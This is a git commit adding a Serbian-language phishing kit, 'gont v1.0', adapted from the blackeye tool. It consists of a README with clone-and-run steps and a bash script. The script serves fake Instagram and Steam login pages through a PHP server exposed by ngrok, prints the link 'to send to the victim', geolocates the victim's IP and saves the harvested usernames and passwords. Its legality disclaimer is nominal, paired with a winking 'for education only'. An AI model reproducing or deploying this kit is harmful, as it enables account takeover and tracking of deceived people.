0e182e7465c58c4c2cc2be12810aac1ab77d6c60
Dusan2222 <77352642+Dusan2222@users.noreply.github.com>
2021-01-14 17:49:42 +0100

    Add files via upload

---
+++ bitno.md
@@ -0,0 +1,33 @@
+## PHISHING w/ gont v1.0
+### PRVA VERZIJA :
+##### Uradjeni Instagram bez UQP-a i Steam sa UQP-om, pali se na masini tako da je nemoguce prikazati stvarnu lokaciju napadaca.(VPS krece)
+##### Pocetak sa moje strane - Dusan Markovic(v1.0)
+####  Radi na principu git clone sa Linuxom i generise ngrok server koji ce slati podatke(informacije) napadacu.
+
+### Slanjem linka bez razloga testiranja nekoj osobi(sa namerom uzimanja naloga ili informacija) je ilegalno i odgovaras sam za sve sto bude.
+
+### Ovo je doradjena verzija od 'linuxQuery'(autora) za phishing.(github) Uzeta ideja i nacin povezivanja ngrok-a.
+
+##### Skripta je na engleskom(vecina, to jest pokretanje sajtova) zbog servera i izgleda na Web Workeru.
+
+## Za sada su zavrseni samo Instagram i Steam kao sto sam rekao ali se u skripti nalaze povezivanja za jos 25ak sajtova.
+### 12 njih je preuzeto sa githuba. U sledecoj verziji se nastavlja drugi deo sajtova za phishing.
+
+### Paljenje:
+```
+git clone https://github.com/thelinuxchoice/blackeye
+
+
+
+cd blackeye
+
+
+
+sudo gont.sh
+
+*Ukoliko ne radi sudo:
+
+bash gont.sh
+```
+
+### svako dobro.
---
+++ gont.sh
@@ -0,0 +1,305 @@
+#!/root/linux/tool
+
+
+trap 'printf "\n";stop;exit 1' 2
+
+
+dependencies() {
+
+command -v curl > /dev/null 2>&1 || { echo >&2 "Pokretanje zahteva curl ali nije instaliran, prekidanje."; exit 1; }
+
+command -v unzip > /dev/null 2>&1 || { echo >&2 "Pokretanje zahteva unzip ali nije instaliran, prekidanje."; exit 1; }
+
+command -v wget > /dev/null 2>&1 || { echo >&2 "Pokretanje zahteva wget ali nije instaliran, prekidanje."; exit 1; }
+
+command -v php > /dev/null 2>&1 || { echo >&2 "Pokretanje zahteva php ali nije instaliran, prekidanje."; exit 1; }
+
+}
+
+menu() {
+
+printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m Steam  \e[0m                              \n"
+
+
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Izaberi opciju: \e[0m\en' option
+
+
+if [[ $option == 1 ]]; then
+server="instagram"
+start
+
+elif [[ $option == 30 ]]; then
+server="steam"
+start
+
+else
+printf "\e[1;93m [!] Pogresna opcija!\e[0m\n"
+menu
+fi
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+fi
+
+
+}
+
+banner() {
+
+
+printf "     \e[101m\e[1;77m:: Sve sto je bitno se nalazi u 'bitno.md'    ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: Nastavak i popravljena verzija(od 0) starog linuxQuerya  ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: Kao sto kazu, za edukaciju samo ;)                 ::\e[0m\n"
+printf "\n"
+printf "     \e[101m\e[1;77m::     gont.v1.0 - @markovi.c_     ::\e[0m\n"
+printf "\n"
+}
+
+createpage() {
+default_cap1="Wi-fi Session Expired"
+default_cap2="Please login again."
+default_user_text="Username:"
+default_pass_text="Password:"
+default_sub_text="Log-In"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
+cap1="${cap1:-${default_cap1}}"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+cap2="${cap2:-${default_cap2}}"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+user_text="${user_text:-${default_user_text}}"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+pass_text="${pass_text:-${default_pass_text}}"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+sub_text="${sub_text:-${default_sub_text}}"
+
+echo "<!DOCTYPE html>" > sites/create/login.html
+echo "<html>" >> sites/create/login.html
+echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
+IFS=$'\n'
+printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
+IFS=$'\n'
+printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
+IFS=$'\n'
+printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
+IFS=$'\n'
+printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
+IFS=$'\n'
+printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
+IFS=$'\n'
+printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
+printf '</center>' >> sites/create/login.html
+printf '<body>\n' >> sites/create/login.html
+printf '</html>\n' >> sites/create/login.html
+
+
+}
+
+catch_cred() {
+
+account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
+cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
+killall -2 php > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+exit 1
+
+}
+
+getcredentials() {
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Cekanje podataka i informacija...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "sites/$server/usernames.txt" ]]; then
+printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Podaci pronadjeni!\n"
+catch_cred
+
+fi
+sleep 1
+done 
+
+
+}
+
+catch_ip() {
+touch sites/$server/saved.usernames.txt
+ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Zrtvin IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Sacuvano:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
+cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+
+
+if [[ -e iptracker.log ]]; then
+rm -rf iptracker.log
+fi
+
+IFS='\n'
+iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+IFS=$'\n'
+continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+printf "\n"
+hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
+if [[ $hostnameip != "" ]]; then
+printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
+fi
+##
+
+reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
+if [[ $reverse_dns != "" ]]; then
+printf "\e[1;92m[*] Reverse DNS-q:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
+fi
+##
+
+
+if [[ $continent != "" ]]; then
+printf "\e[1;92m[*] Kontinent:\e[0m\e[1;77m %s\e[0m\n" $continent
+fi
+##
+
+country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+if [[ $country != "" ]]; then
+printf "\e[1;92m[*] Drzava:\e[0m\e[1;77m %s\e[0m\n" $country
+fi
+##
+
+state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+if [[ $state != "" ]]; then
+printf "\e[1;92m[*] Grad:\e[0m\e[1;77m %s\e[0m\n" $state
+fi
+##
+city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+if [[ $city != "" ]]; then
+printf "\e[1;92m[*] Lokacija grada:\e[0m\e[1;77m %s\e[0m\n" $city
+fi
+##
+
+isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $isp != "" ]]; then
+printf "\e[1;92m[*] ISPz:\e[0m\e[1;77m %s\e[0m\n" $isp
+fi
+##
+
+as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $as_number != "" ]]; then
+printf "\e[1;92m[*] AS-3-3 Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
+fi
+##
+
+ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $ip_speed != "" ]]; then
+printf "\e[1;92m[*] IP Address Brzina:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
+fi
+##
+ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+if [[ $ip_currency != "" ]]; then
+printf "\e[1;92m[*] Valuta:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
+fi
+##
+printf "\n"
+rm -rf iptracker.log
+
+getcredentials
+}
+
+start() {
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+
+fi
+
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+
+printf "\e[1;92m[\e[0m*\e[1;92m] Skidam ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Greska pri skidanju... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+
+
+else
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Greska pri skidanju.. \e[0m\n"
+exit 1
+fi
+fi
+fi
+
+printf "\e[1;92m[\e[0m*\e[1;92m] Pokrecem php server(AMP)...\n"
+cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m*\e[1;92m] Pokrecem ngrok server(127.0.0.1:4040/status)...\n"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Link koji treba da se posalje zrtvi:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Ukoliko gore nije izasao link, iznad pise URL(127....) na koji treba da se udje za link(.ngrok.io)\n"
+checkfound
+}
+checkfound() {
+
+
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Sve je spremno, prostor nadjen, cekam otvaranje linka ...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "sites/$server/ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Pronadjen!!!\n"
+catch_ip
+
+fi
+sleep 1
+done 
+
+}
+
+banner
+dependencies
+menu
+
